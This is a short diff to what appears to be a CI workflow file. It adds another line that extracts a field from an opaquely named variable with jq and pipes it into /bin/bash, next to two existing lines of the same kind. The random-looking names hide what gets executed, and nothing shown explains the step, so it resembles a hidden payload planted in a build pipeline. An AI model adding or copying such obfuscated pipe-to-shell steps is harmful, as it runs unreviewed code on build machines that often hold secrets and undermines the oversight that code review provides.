@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$jl189" | jq -r .v586 | /bin/bash
           echo $smdyx5 | jq -r .igj8 | /bin/bash
+          echo $iz202 | jq -r .i5 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
